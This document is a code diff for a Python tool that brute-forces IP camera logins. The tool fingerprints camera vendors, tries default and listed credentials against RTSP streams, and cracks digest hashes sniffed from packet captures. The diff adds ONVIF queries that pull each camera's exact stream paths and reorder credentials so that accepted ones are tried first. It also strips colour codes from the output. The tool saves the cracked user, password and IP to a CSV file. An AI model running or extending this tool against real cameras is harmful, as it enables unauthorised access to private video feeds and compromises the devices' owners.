@@ -7,10 +7,13 @@ Given a list of IP cameras (or a packet capture), it:
   2. Fingerprints each camera's vendor AND model (ONVIF when available, else
      RTSP/HTTP headers).
   3. Builds an ordered list of RTSP *routes* (stream paths + ports) for that
-     vendor/model from the bundled scraped ispyconnect database
-     (``data/cameras.csv``) — the model-specific paths first, then the
-     vendor-wide paths, then a set of generic fall-back paths (including the
-     bare ``rtsp://host:port`` root, which a few DVRs accept).
+     vendor/model. When the camera speaks ONVIF, ``GetStreamUri`` yields the
+     device's *exact* stream path(s), which go to the front of the list (turning
+     path discovery from a guess into a fact). Behind those come the
+     model-specific paths from the bundled scraped ispyconnect database
+     (``data/cameras.csv``), then the vendor-wide paths, then a set of generic
+     fall-back paths (including the bare ``rtsp://host:port`` root, which a few
+     DVRs accept).
   4. Brute forces with a native RTSP ``DESCRIBE`` engine (no per-attempt FFmpeg
      process): first an unauthenticated route-discovery pass, then a credential
      attack that tries the fingerprinted vendor's default credential FIRST,
@@ -46,7 +49,7 @@ from base64 import b64decode, b64encode
 from collections import namedtuple, defaultdict
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from optparse import OptionParser
-from colorama import Fore, Back, Style
+from colorama import Fore, Style
 from time import strftime, localtime, time
 
 # OpenCV is only needed for the optional frame capture on a successful login.
@@ -181,6 +184,13 @@ except Exception:
     _HAS_ONVIF = False
 
 ONVIF_PORTS = [80, 8000, 8899, 2020, 8080]
+
+# Bounds for ONVIF stream-path discovery, so a big password list can't turn into
+# a slow SOAP storm (or trip account lockout) and a many-channel NVR can't flood
+# the route list with every channel. The first accepted credential wins; the
+# first few profiles (channel 1 main/sub …) are the useful ones.
+ONVIF_MAX_CRED_PROBES = 8
+ONVIF_MAX_STREAM_ROUTES = 8
 
 # Default port per protocol when a DB row reports port 0 ("unspecified").
 DEFAULT_PORTS = {"rtsp": 554, "http": 80, "https": 443}
@@ -449,6 +459,83 @@ def _onvif_fingerprint(host, http_port, username, password, timeout):
     return None, None
 
 
+def _parse_stream_uri(uri, host, default_port):
+    """Turn an ONVIF GetStreamUri result into a ``(path, port)`` route.
+
+    The path/query is taken verbatim (it is the device's authoritative stream
+    path), but rebuilt against the *target* host: some cameras report an internal
+    hostname or 0.0.0.0 in the URI, which would be unreachable."""
+    from urllib.parse import urlsplit
+    parts = urlsplit(uri)
+    path = parts.path or "/"
+    if parts.query:
+        path += "?" + parts.query
+    try:
+        port = parts.port or default_port
+    except ValueError:
+        port = default_port
+    return path, port
+
+
+def onvif_stream_routes(host, http_port, rtsp_port, creds, timeout):
+    """Ask the camera, via ONVIF ``GetStreamUri``, for its exact RTSP stream paths.
+
+    Returns ``(routes, working_cred)``: ``routes`` is an ordered list of
+    ``(path, port)`` taken straight from the device's media profiles, and
+    ``working_cred`` is the first credential ONVIF accepted (a good bet to try
+    first at the RTSP layer). Returns ``([], None)`` when ONVIF is unavailable,
+    no port answers, or no supplied credential is accepted.
+    """
+    if not _HAS_ONVIF:
+        return [], None
+    ports = [http_port] + [p for p in ONVIF_PORTS if p != http_port]
+    attempts = 0
+    for port in ports:
+        if timeout and not tcp_reachable(host, [port], timeout):
+            continue                     # no service here — don't hang on it
+        speaks_onvif = False
+        for user, password in creds:
+            if attempts >= ONVIF_MAX_CRED_PROBES:
+                return [], None
+            attempts += 1
+            try:
+                cam = ONVIFCamera(host, port, user or "", password or "")
+                media = cam.create_media_service()
+                profiles = media.GetProfiles()
+                routes, seen = [], set()
+                for profile in profiles:
+                    try:
+                        request = media.create_type("GetStreamUri")
+                        request.ProfileToken = profile.token
+                        request.StreamSetup = {"Stream": "RTP-Unicast",
+                                               "Transport": {"Protocol": "RTSP"}}
+                        uri = getattr(media.GetStreamUri(request), "Uri", "") or ""
+                    except Exception:
+                        continue
+                    if not uri:
+                        continue
+                    route = _parse_stream_uri(uri, host, rtsp_port)
+                    if route not in seen:
+                        seen.add(route)
+                        routes.append(route)
+                    if len(routes) >= ONVIF_MAX_STREAM_ROUTES:
+                        break
+                if routes:
+                    return routes, (user, password)
+            except Exception as exc:
+                # A SOAP fault (or an auth-rejection message) means the port
+                # speaks ONVIF but this credential was rejected — try the next
+                # credential. A transport/parse error before ONVIF ever answered
+                # means there's no ONVIF service here — move to the next port.
+                blob = f"{type(exc).__name__} {exc}".lower()
+                if "fault" in blob or "auth" in blob or "not authorized" in blob:
+                    speaks_onvif = True
+                if speaks_onvif:
+                    continue
+                break
+    return [], None
+
+
 def fingerprint(host, http_port, rtsp_port, username, password, timeout):
     """Identify a camera's ``(vendor, model)`` best-signal-first.
 
@@ -709,7 +796,7 @@ def crack_host(target, base_combos, db, options):
             host, [rtsp_port, http_port], options["reach_timeout"]):
         with lock:
             if options["verbose"]:
-                display('-', f"{Back.MAGENTA}{target}{Back.RESET} => Unreachable (skipped)")
+                display('-', f"{target} => Unreachable (skipped)")
         return {"status": "UNREACHABLE", "ip": target, "vendor": "", "model": "", "url": ""}
 
     vendor, model = (None, None)
@@ -719,12 +806,28 @@ def crack_host(target, base_combos, db, options):
                                     options["reach_timeout"] or 3.0)
         if options["verbose"] and (vendor or model):
             with lock:
-                display('*', f"{Back.MAGENTA}{target}{Back.RESET} => Vendor="
-                             f"{Back.CYAN}{vendor or '?'}{Back.RESET} Model="
-                             f"{Back.CYAN}{model or '?'}{Back.RESET}")
+                display('*', f"{target} => Vendor={vendor or '?'} Model={model or '?'}")
 
     routes = db.rtsp_routes(vendor, model, rtsp_port, options["max_routes"])
     creds = ordered_credentials(vendor, base_combos, db, options)
+
+    # Ask the device itself (ONVIF GetStreamUri) for its exact stream path(s).
+    # These are authoritative, so they go to the front of the route list and the
+    # credential ONVIF accepted is tried first — turning path discovery from a
+    # guess into a fact whenever the camera speaks ONVIF.
+    if options["fingerprint"]:
+        onvif_routes, onvif_cred = onvif_stream_routes(
+            host, http_port, rtsp_port, creds, options["reach_timeout"] or 3.0)
+        if onvif_routes:
+            seen = set()
+            routes = [r for r in onvif_routes + routes
+                      if not (r in seen or seen.add(r))]
+            if options["verbose"]:
+                with lock:
+                    display('*', f"{target} => ONVIF exact path: "
+                                 f"rtsp://{host}:{onvif_routes[0][1]}{onvif_routes[0][0]}")
+        if onvif_cred and onvif_cred in creds:
+            creds = [onvif_cred] + [c for c in creds if c != onvif_cred]
 
     result = rtsp_bruteforce(host, routes, creds, options["rtsp_timeout"])
     if result:
@@ -736,8 +839,8 @@ def crack_host(target, base_combos, db, options):
         elif result.get("no_route"):
             note = " (auth ok, stream path unknown)"
         with lock:
-            display('+', f"{Back.BLUE}{result['user']}{Back.RESET}:{Back.CYAN}{result['password']}"
-                         f"{Back.RESET}@{Back.MAGENTA}{target}{Back.RESET} => "
+            display('+', f"{result['user']}:{result['password']}"
+                         f"@{target} => "
                          f"Access Granted (vendor={vendor or '?'}){note}")
         return {"status": "OK", "ip": target, "user": result["user"],
                 "password": result["password"], "vendor": vendor or "",
@@ -760,8 +863,8 @@ def crack_digest_device(device, passwords):
     for password in passwords:
         if calculateDigestResponse(username, password, realm, method, uri, nonce) == response:
             with lock:
-                display('+', f"{Back.BLUE}{username}{Back.RESET}:{Back.CYAN}{password}"
-                             f"{Back.RESET}@{Back.MAGENTA}{ip}{Back.RESET} => Cracked")
+                display('+', f"{username}:{password}"
+                             f"@{ip} => Cracked")
             return {"status": "OK", "ip": ip, "user": username,
                     "password": password, "vendor": "", "model": "", "url": ""}
     return None
@@ -787,21 +890,21 @@ if __name__ == "__main__":
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     if not arguments.password:
-        display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
-        display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
+        display('*', f"No PASSWORD Specified")
+        display(':', f"Setting Password to Blank")
         arguments.password = ['']
     else:
         try:
             with open(arguments.password, 'rb') as file:
-                display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
+                display(':', f"Loading Passwords from File {arguments.password}")
                 arguments.password = [password for password in file.read().decode(errors="ignore").split('\n')]
-                display('+', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
+                display('+', f"Passwords Loaded = {len(arguments.password)}")
         except FileNotFoundError:
             arguments.password = [password for password in arguments.password.split(',')]
         except OSError:
             arguments.password = [password for password in arguments.password.split(',')]
         except:
-            display('-', f"Error Loading Passwords from File {Back.YELLOW}{arguments.password}{Back.RESET}")
+            display('-', f"Error Loading Passwords from File {arguments.password}")
             exit(0)
     if not arguments.ip and not arguments.capture_file:
         display('-', "Please Provide a List of IP Addresses")
@@ -851,27 +954,27 @@ if __name__ == "__main__":
                     except:
                         pass
             except Exception as error:
-                display('-', f"Error Occured while reading Packet Capture File {Back.MAGENTA}{packet_capture_file}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
+                display('-', f"Error Occured while reading Packet Capture File {packet_capture_file} => {error}")
         del rtsp_authentications
         rtsp_devices = list(rtsp_devices.values())
         successful_logins = []
         for rtsp_device in rtsp_devices:
             print(Fore.CYAN + '-'*100 + Fore.RESET)
-            display('*', f"RTSP Device => {Back.MAGENTA}{rtsp_device['device']}{Back.RESET}")
-            display('*', f"RTSP Client => {Back.MAGENTA}{rtsp_device['source']}{Back.RESET}")
-            display('*', f"RTSP Device Port => {Back.MAGENTA}{rtsp_device['device_port']}{Back.RESET}")
-            display('*', f"RTSP Client Port => {Back.MAGENTA}{rtsp_device['source_port']}{Back.RESET}")
-            display('+', f"Method => {Back.MAGENTA}{rtsp_device['method']}{Back.RESET}")
-            display('+', f"Authorization => {Back.MAGENTA}{rtsp_device['authorization']}{Back.RESET}")
+            display('*', f"RTSP Device => {rtsp_device['device']}")
+            display('*', f"RTSP Client => {rtsp_device['source']}")
+            display('*', f"RTSP Device Port => {rtsp_device['device_port']}")
+            display('*', f"RTSP Client Port => {rtsp_device['source_port']}")
+            display('+', f"Method => {rtsp_device['method']}")
+            display('+', f"Authorization => {rtsp_device['authorization']}")
             if rtsp_device['authorization'] == "DIGEST":
-                display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
-                display(':', f"\t* Realm = {Back.MAGENTA}{rtsp_device['realm']}{Back.RESET}")
-                display(':', f"\t* Nonce = {Back.MAGENTA}{rtsp_device['nonce']}{Back.RESET}")
-                display(':', f"\t* URI = {Back.MAGENTA}{rtsp_device['uri']}{Back.RESET}")
-                display(':', f"\t* Response = {Back.MAGENTA}{rtsp_device['response']}{Back.RESET}")
+                display(':', f"\t* Username = {rtsp_device['username']}")
+                display(':', f"\t* Realm = {rtsp_device['realm']}")
+                display(':', f"\t* Nonce = {rtsp_device['nonce']}")
+                display(':', f"\t* URI = {rtsp_device['uri']}")
+                display(':', f"\t* Response = {rtsp_device['response']}")
             else:
-                display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
-                display(':', f"\t* Password = {Back.MAGENTA}{rtsp_device['password']}{Back.RESET}")
+                display(':', f"\t* Username = {rtsp_device['username']}")
+                display(':', f"\t* Password = {rtsp_device['password']}")
                 successful_logins.append({"ip": rtsp_device["device"], "user": rtsp_device["username"], "password": rtsp_device["password"], "vendor": "", "model": "", "url": ""})
             print(Fore.CYAN + '-'*100 + Fore.RESET)
         if arguments.capture_file_data:
@@ -879,7 +982,7 @@ if __name__ == "__main__":
                 dump(rtsp_devices, file)
         digest_devices = [[rtsp_device["device"], rtsp_device["username"], rtsp_device["realm"], rtsp_device["method"], rtsp_device["uri"], rtsp_device["nonce"], rtsp_device["response"].strip()] for rtsp_device in rtsp_devices if rtsp_device["authorization"] == "DIGEST"]
         if digest_devices:
-            display(':', f"Cracking {Back.MAGENTA}{len(digest_devices)}{Back.RESET} Digest Authentication(s)", start='\n')
+            display(':', f"Cracking {len(digest_devices)} Digest Authentication(s)", start='\n')
             if _HAS_TQDM:
                 _active_bar = tqdm(total=len(digest_devices), desc="Cracking digests", unit="dev")
             with ThreadPoolExecutor(max_workers=threads_number) as executor:
@@ -896,32 +999,32 @@ if __name__ == "__main__":
         for ip_detail in arguments.ip.split(','):
             try:
                 with open(ip_detail, 'r') as file:
-                    display(':', f"Loading IPs from File {Back.MAGENTA}{ip_detail}{Back.RESET}")
+                    display(':', f"Loading IPs from File {ip_detail}")
                     current_ips = [ip for ip in file.read().split('\n') if ip.strip()]
                     ips.extend(current_ips)
-                    display('+', f"IPs Loaded = {Back.MAGENTA}{len(current_ips)}{Back.RESET}")
+                    display('+', f"IPs Loaded = {len(current_ips)}")
             except FileNotFoundError:
                 ips.append(ip_detail)
             except:
-                display('-', f"Error Loading IPs from File {Back.YELLOW}{arguments.ip}{Back.RESET}")
+                display('-', f"Error Loading IPs from File {arguments.ip}")
                 exit(0)
         ips = [ip for ip in ips if ip.strip()]
         if not arguments.user:
-            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
-            display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
+            display('*', f"No USER Specified")
+            display(':', f"Trying to Find Unauthorized Access")
             arguments.user = ['']
         else:
             try:
                 with open(arguments.user, 'r') as file:
-                    display(':', f"Loading Users from File {Back.MAGENTA}{arguments.user}{Back.RESET}")
+                    display(':', f"Loading Users from File {arguments.user}")
                     arguments.user = [user for user in file.read().split('\n')]
-                    display('+', f"Users Loaded = {Back.MAGENTA}{len(arguments.user)}{Back.RESET}")
+                    display('+', f"Users Loaded = {len(arguments.user)}")
             except FileNotFoundError:
                 arguments.user = [user for user in arguments.user.split(',')]
             except OSError:
                 arguments.user = [user for user in arguments.user.split(',')]
             except:
-                display('-', f"Error Loading Users from File {Back.YELLOW}{arguments.user}{Back.RESET}")
+                display('-', f"Error Loading Users from File {arguments.user}")
                 exit(0)
 
         # Thread count / boolean flags / timeouts.
@@ -937,18 +1040,18 @@ if __name__ == "__main__":
             frames_folder.mkdir(exist_ok=True)
             capture_frame = True
             if not _HAS_CV2:
-                display('*', f"OpenCV not installed — frame capture ({Back.MAGENTA}-c{Back.RESET}) will be skipped")
+                display('*', f"OpenCV not installed — frame capture (-c) will be skipped")
 
         # Load the scraped camera DB (routes) + default-credentials list.
         creds_path = resolve_path(arguments.default_creds, DEFAULT_CREDS_PATHS)
         camera_db_path = resolve_path(arguments.camera_db, CAMERA_DB_PATHS)
         db = CameraDB.load(camera_db_path, creds_path)
         if camera_db_path:
-            display('+', f"Loaded {Back.MAGENTA}{db.template_count}{Back.RESET} RTSP route template(s) from {Back.MAGENTA}{camera_db_path}{Back.RESET}")
+            display('+', f"Loaded {db.template_count} RTSP route template(s) from {camera_db_path}")
         else:
             display('*', f"No camera DB found (looked for bundled data/cameras.csv). Using generic RTSP routes only.")
         if creds_path:
-            display('+', f"Loaded {Back.MAGENTA}{db.vendor_count}{Back.RESET} vendor default credential(s) from {Back.MAGENTA}{creds_path}{Back.RESET}")
+            display('+', f"Loaded {db.vendor_count} vendor default credential(s) from {creds_path}")
         elif fingerprint_enabled or all_defaults_enabled:
             display('*', f"No default-credentials list found (looked for bundled data/default_credentials.csv). Vendor defaults disabled.")
 
@@ -972,10 +1075,10 @@ if __name__ == "__main__":
         }
 
         total_ips = len(ips)
-        display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
-        display(':', f"Base Credential Combinations  = {Back.MAGENTA}{len(base_combos)}{Back.RESET}")
-        display(':', f"Fingerprinting = {Back.MAGENTA}{fingerprint_enabled}{Back.RESET}, Vendor Defaults = {Back.MAGENTA}{options['use_defaults']}{Back.RESET}, All Defaults Fallback = {Back.MAGENTA}{options['all_defaults']}{Back.RESET}, Max Routes = {Back.MAGENTA}{max_routes}{Back.RESET}")
-        display(':', f"Starting {Back.MAGENTA}{threads_number}{Back.RESET} Threads", start='\n')
+        display(':', f"Total Number of IP Addresses = {total_ips}")
+        display(':', f"Base Credential Combinations  = {len(base_combos)}")
+        display(':', f"Fingerprinting = {fingerprint_enabled}, Vendor Defaults = {options['use_defaults']}, All Defaults Fallback = {options['all_defaults']}, Max Routes = {max_routes}")
+        display(':', f"Starting {threads_number} Threads", start='\n')
 
         t1 = time()
         successful_logins = []
@@ -997,15 +1100,15 @@ if __name__ == "__main__":
             _active_bar = None
         t2 = time()
 
-        display('+', f"All {Back.MAGENTA}{threads_number}{Back.RESET} Threads Completed Execution", start='\n')
-        display(':', f"\tTotal IP Addresses       = {Back.MAGENTA}{total_ips}{Back.RESET}")
-        display(':', f"\tSuccessful Authorization = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
-        display(':', f"\tUnreachable Hosts        = {Back.MAGENTA}{unreachable}{Back.RESET}")
-        display(':', f"\tTime Taken               = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
+        display('+', f"All {threads_number} Threads Completed Execution", start='\n')
+        display(':', f"\tTotal IP Addresses       = {total_ips}")
+        display(':', f"\tSuccessful Authorization = {len(successful_logins)}")
+        display(':', f"\tUnreachable Hosts        = {unreachable}")
+        display(':', f"\tTime Taken               = {t2-t1:.2f} seconds")
         if t2 > t1:
-            display(':', f"\tRate                     = {Back.MAGENTA}{total_ips/(t2-t1):.2f} IPs/second{Back.RESET}")
-    display(':', f"Dumping Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}", start='\n')
+            display(':', f"\tRate                     = {total_ips/(t2-t1):.2f} IPs/second")
+    display(':', f"Dumping Successfully Authorized IP Addresses in file {arguments.write}", start='\n')
     with open(arguments.write, 'w') as file:
         file.write("User,Password,IP,Vendor,Model,URL\n")
         file.write('\n'.join([f"{login.get('user', '')},{login.get('password', '')},{login.get('ip', '')},{login.get('vendor', '')},{login.get('model', '')},{login.get('url', '')}" for login in successful_logins]))
-    display('+', f"Dumped Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}")
+    display('+', f"Dumped Successfully Authorized IP Addresses in file {arguments.write}")
